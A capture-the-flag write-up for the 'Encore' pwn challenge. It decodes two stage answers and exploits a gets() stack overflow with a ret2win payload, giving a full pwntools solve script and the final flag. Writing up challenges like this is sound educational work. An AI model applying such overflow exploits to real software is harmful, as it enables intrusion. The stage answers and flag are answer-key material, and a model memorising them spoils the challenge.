---
title: "Encore"
ctf: "Safaricom CTF"
date: 2026-10-06
category: pwn
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Encore

> **Category:** PWN · **Points:** 500 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- Target: `http://54.72.82.22:8200` (Werkzeug/Flask desk; binary served at `/download`)
- Binary: `/download` on the desk — sha256 `9a51e70f7c101942bf55640fb802168518e8e70e80a32b7eafc17b1061d23c48`

## Mitigations

| | |
|---|---|
| Arch | amd64-64-little |
| PIE | **No** (base `0x400000`) |
| Canary | **None** |
| NX | **Disabled** (GNU_STACK missing) — stack executable |
| RELRO | Partial |
| SHSTK/IBT | property bits set (CET-compiled, `endbr64`) but not enforced |

Classic unhardened binary. No remote `nc` service is needed: the binary itself
tells the player to submit answers on the web interface, so all three answers
are POSTed to the desk.

## The binary

Three sequential stages, each verifying input; failure calls `exit(1)`.

**Stage 1 — `stage1_reverse_engineering`**: builds a 14-byte blob on the stack and
XORs each byte with `0x42`, then `strcmp`s against input.
Decoded key: **`R3v3rs3_M4st3r`**.

**Stage 2 — `stage2_cryptography`**: `vigenere_decrypt(cipher, "ENCORE")` then
`caesar13_decrypt` (ROT13), compared to input. Cipher is the marquee string
`Fvtsjcfw_1h_Q0a3iwua`. Decrypts to **`Overflow_1s_P0w3rful`**.

**Stage 3 — `stage3_exploitation` (the bug)**: `gets(rbp-0x40)` into a 64-byte
buffer — unbounded stack overflow, no canary, no PIE. Win function
`print_token` @ `0x40197b` prints the static token
`STAGE3_TOKEN = "3nc0r3_pwn3d_2025"` (`.rodata` @ `0x402010`) and `exit`s.

## Exploit chain

ret2win: `payload = b"A"*0x40 + b"B"*8 + p64(print_token)`.
Offset = 0x40 buffer + 8 saved RBP = 72 bytes, then the return address.
`print_token` prints the Stage 3 token.

## Web submission (`/submit/stageN`, session cookie required)

1. `stage1` = `R3v3rs3_M4st3r`
2. `stage2` = `Overflow_1s_P0w3rful`
3. `stage3` = `3nc0r3_pwn3d_2025` → returns the flag.

Requests must share the Flask session cookie (`GET /` first); otherwise the desk
replies `Please complete Stage N first!`.

`solve.py` runs the binary locally to obtain the token via the exploit, then
performs the three web submissions and prints the flag.

## Solve script

`pwn/encore/solve.py`:

```python
#!/usr/bin/env python3
"""Encore (PWN) — ret2win + three-stage web submission.

Reproducible solve:
  1. Fetches the binary from the desk if ./encore is missing.
  2. Derives Stage 1 / Stage 2 answers by running the binary.
  3. Exploits the Stage 3 gets() overflow (ret2win -> print_token) to get the token.
  4. Submits all three answers over the Flask desk (same session) and prints the flag.

Run:  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import os
import re
import sys

from pwn import context, process, p64, ELF

HOST = "54.72.82.22"
PORT = 8200
DESK = f"http://{HOST}:{PORT}"
BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "encore")

PRINT_TOKEN = 0x40197B   # win function
STAGE1_ANS = b"R3v3rs3_M4st3r"
STAGE2_ANS = b"Overflow_1s_P0w3rful"

context.log_level = "error"


def ensure_binary():
    if not os.path.exists(BINARY):
        import urllib.request
        urllib.request.urlretrieve(f"{DESK}/download", BINARY)
        os.chmod(BINARY, 0o755)
    elf = ELF(BINARY, checksec=False)
    # sanity: win function present
    assert elf.symbols.get("print_token") == PRINT_TOKEN, "unexpected binary layout"


def get_stage3_token():
    """Run locally: answer stages 1+2, then smash the stack to call print_token."""
    payload = b"A" * 0x40 + b"B" * 8 + p64(PRINT_TOKEN)
    p = process(BINARY)
    p.sendline(STAGE1_ANS)
    p.sendline(STAGE2_ANS)
    p.sendline(payload)
    out = p.recvall(timeout=5).decode(errors="replace")
    m = re.search(r"Stage 3 token:\s*(\S+)", out)
    if not m:
        sys.exit(f"exploit failed, output:\n{out}")
    return m.group(1)


def submit_all(token):
    import requests
    s = requests.Session()
    s.get(f"{DESK}/", timeout=10)  # establish Flask session cookie
    answers = {"stage1": STAGE1_ANS.decode(),
               "stage2": STAGE2_ANS.decode(),
               "stage3": token}
    flag = None
    for stage, ans in answers.items():
        r = s.post(f"{DESK}/submit/{stage}", json={"answer": ans}, timeout=10)
        data = r.json()
        print(f"[{stage}] {data.get('message')}")
        if not data.get("success"):
            sys.exit(f"stage {stage} rejected")
        if data.get("flag"):
            flag = data["flag"]
    return flag


def main():
    ensure_binary()
    token = get_stage3_token()
    print(f"[*] Stage 3 token: {token}")
    flag = submit_all(token)
    if not flag:
        sys.exit("no flag returned")
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- pwntools
- Python `urllib` (stdlib HTTP client)
- Python `requests` (HTTP client)
- Python 3 (solver)
- checksec

**Other tools that fit this category:**

- pwntools (exploit dev)
- GDB + pwndbg/GEF
- Ghidra / IDA (static)
- radare2 / rizin
- ROPgadget / ropper
- one_gadget
- checksec, patchelf

## Flag

```
safctf{a6aca5b356ad7824a01d0a767b2cd998}
```
